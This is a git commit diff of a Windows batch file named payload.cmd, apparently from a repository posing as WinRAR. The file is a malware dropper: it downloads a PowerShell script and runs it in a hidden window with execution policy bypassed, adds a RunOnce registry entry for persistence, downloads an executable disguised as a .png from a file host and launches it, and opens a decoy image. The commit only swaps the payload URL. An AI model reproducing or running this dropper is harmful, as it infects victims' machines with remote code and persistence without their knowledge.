c24768bf35e2183e480ca754d066f401dc7d15d2
MisericordeXHD <145233261+MisericordeXHD@users.noreply.github.com>
2023-10-03 07:40:20 +1100

    Update payload.cmd

--- payload.cmd
+++ payload.cmd
@@ -6,6 +6,6 @@ curl -X GET https://cdn.discordapp.com/attachments/1123352422614573067/115276749
 curl -X GET https://raw.githubusercontent.com/MisericordeXHD/winrar/main/helper.ps1 -o %temp%\script.ps1
 powershell.exe saps cmd.exe '/c %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass %temp%\script.ps1' -WindowStyle Hidden
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v SystemTray /t REG_SZ /d %programdata%\GraphicsType\SystemTray.bat
-curl -X GET https://files.catbox.moe/wmpcuq.png -o %programdata%\GraphicsType\SystemTray.exe
+curl -X GET https://files.catbox.moe/2604cz.png -o %programdata%\GraphicsType\SystemTray.exe
 start explorer.exe %programdata%\GraphicsType\SystemTray.exe
 start %temp%\seins.jpg
